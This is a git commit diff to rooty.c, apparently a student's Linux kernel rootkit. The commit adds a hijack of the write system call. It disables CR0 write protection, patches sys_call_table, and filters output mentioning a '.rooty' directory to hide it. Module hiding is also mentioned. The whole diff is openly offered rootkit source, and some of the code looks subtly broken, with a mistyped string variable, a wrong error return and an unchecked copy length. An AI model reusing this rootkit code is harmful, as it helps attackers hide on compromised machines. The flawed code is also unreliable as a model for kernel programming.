154f2d2e7463fbea71f0b333b39e7586d133bee3
des <sachedes@students.zhaw.ch>
2014-06-18 17:40:38 +0200

    last changes for write hijack

--- rooty.c
+++ rooty.c
@@ -3,6 +3,9 @@
 #include <linux/kernel.h>
 #include <linux/unistd.h>
 #include <linux/syscalls.h>
+#include <linux/string.h>
+#include <linux/slab.h>
+#include <linux/kobject.h>
 
 MODULE_LICENSE("GPL");
 int rooty_init(void);
@@ -23,6 +26,7 @@ typedef unsigned int psize;
 typedef unsigned long psize;
 #endif
 
+asmlinkage ssize_t (*o_write)(int fd, const char __user *buff, ssize_t count);
 
 /* find sys_call_table */
 
@@ -40,6 +44,21 @@ psize **find(void) {
  return NULL;
 }
 
+asmlinkage ssize_t rooty_write(int fd, const char __user *buff, size_t count) {
+ int r; /* return */
+ char proc_protect = ".rooty"; /* directory name to protect */
+ char *kbuff = (char *) kmalloc(256,GFP_KERNEL); /* allocate kernel memory for memory from userland */
+ copy_from_user(kbuff,buff,255); /* copy the userland memory to the kernel memory allocation */
+ if (strstr(kbuff,proc_protect)) { /* does the write buffer memroy contain the protected directory name */
+  kfree(kbuff); /* Then free it */
+  /* don't display ls write error with ENOTDIR/ENOENT */
+  return EEXIST; /* And return file exists error */
+ }
+ r = o_write(fd,buff,count); /* Otherwise return data from original write system call */
+ kfree(kbuff);
+ return r;
+}
+
 int rooty_init(void) {
   
 /* Hide module from lsmod - commented out for troubleshooting reasons, will be activated again at the end  
@@ -54,9 +73,25 @@ int rooty_init(void) {
   } else {
       printk("rooty: sys_call_table not found\n");
   }
+  
+  /* disable WP (write protect) in cr0 */
+  write_cr0(read_cr0() & (~ 0x10000)); 
+  
+  /* write hijack */
+  o_write = (void *)xchg(&sys_call_table[__NR_write],rooty_write); 
+  
+  /* turn WP back on */
+  write_cr0(read_cr0() | 0x10000); 
+  
  return 0;
 }
 
 void rooty_exit(void) {
+  
+  /* change back to before rooty execution */
+   write_cr0(read_cr0() & (~ 0x10000));
+ xchg(&sys_call_table[__NR_write],o_write);
+ write_cr0(read_cr0() | 0x10000);
+  
   printk("rooty: module removed\n");
 }
